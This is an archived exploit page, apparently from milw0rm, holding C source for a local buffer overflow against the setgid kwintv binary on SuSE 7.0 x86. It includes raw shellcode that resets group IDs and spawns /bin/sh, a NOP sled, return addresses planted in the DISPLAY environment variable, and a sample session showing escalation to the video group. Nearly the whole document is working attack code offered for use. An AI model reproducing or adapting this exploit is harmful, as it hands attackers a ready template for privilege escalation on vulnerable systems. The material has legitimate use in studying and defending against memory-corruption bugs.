<html><head><title>Kwintv Local Buffer Overflow Exploit (gid=video(33))</title></head><pre>/*
 * (kwintv) local buffer overflow. (gid=video(33))
 *
 * Author: Cody Tubbs (loophole of hhp).
 * www.hhp-programming.net / pigspigs@yahoo.com
 * 12/17/2000
 *
 * For SuSE 7.0 - x86.
 * sgid &quot;video&quot;(33) by default.
 *
 * bash-2.04$ id
 * uid=1000(loophole) gid=501(noc)
 * bash-2.04$ ./b 0
 * Ret-addr 0xbfffe1fc, offset: 0, allign: 0.
 * sh-2.04$ id
 * uid=1000(loophole) gid=33(video)
 * sh-2.04$
 *
 */

#include &lt;stdio.h&gt;

#define OFFSET 0
#define ALLIGN 0
#define NOP    0x90
#define DBUF   481 //481+((RET)).
#define GID    33

static char shellcode[]=
  &quot;\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x00\x31\xc0&quot;
  &quot;\xb0\x47\xcd\x80\x31\xdb\x31\xc9\xb3\x00\xb1\x00\x31&quot;
  &quot;\xc0\xb0\x47\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0&quot;
  &quot;\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08&quot;
  &quot;\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8&quot;
  &quot;\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x69&quot;;

long get_sp(void){
  __asm__(&quot;movl %esp,%eax&quot;);
}

void workit(char *heh){
  fprintf(stderr, &quot;\n(kwintv) local exploit for SuSE 7.0 - x86\n&quot;);
  fprintf(stderr, &quot;Author: Cody Tubbs (loophole of hhp)\n\n&quot;);
  fprintf(stderr, &quot;Usage: %s &lt;offset&gt; [allign(0..3)]\n&quot;, heh);
  fprintf(stderr, &quot;Examp: %s 0\n&quot;, heh);
  fprintf(stderr, &quot;Examp: %s 0 1\n&quot;, heh);
  exit(1);
}


main(int argc, char **argv){
  char eipeip[DBUF], buffer[4096], heh[DBUF+1];
  int i, offset, gid, allign;
  long address;

  if(argc&lt;2){
    workit(argv[0]);
  }
 
  if(argc&gt;1){offset=atoi(argv[1]);}else{offset=OFFSET;}
  if(argc&gt;2){allign=atoi(argv[2]);}else{allign=ALLIGN;}

  address=get_sp()-offset;

  if(allign&gt;0){for(i=0;i&lt;allign;i++){eipeip[i]=0x69;}}//0x69.HEH.:D
  for(i=allign;i&lt;DBUF;i+=4){*(long *)&amp;eipeip[i]=address;}

  gid=GID;
  shellcode[10]=gid;
  shellcode[22]=gid;
  shellcode[24]=gid;
 
  for(i=0;i&lt;(4096-strlen(shellcode)-strlen(eipeip));i++){
    buffer[i]=NOP;
  }
 
  memcpy(heh, eipeip, strlen(eipeip));
  memcpy(heh, &quot;DISPLAY=&quot;, 8);
  putenv(heh);

  memcpy(buffer+i, shellcode, strlen(shellcode));
  memcpy(buffer, &quot;KWINEX=&quot;, 7);
  putenv(buffer);
 
  fprintf(stderr, &quot;Ret-addr %#x, offset: %d, allign: %d.\n&quot;,address,offset,allign);
  execlp(&quot;/opt/kde/bin/kwintv&quot;, &quot;kwintv&quot;, 0);//Change path if needed. :D
}


// milw0rm.com [2000-12-06]</pre></html>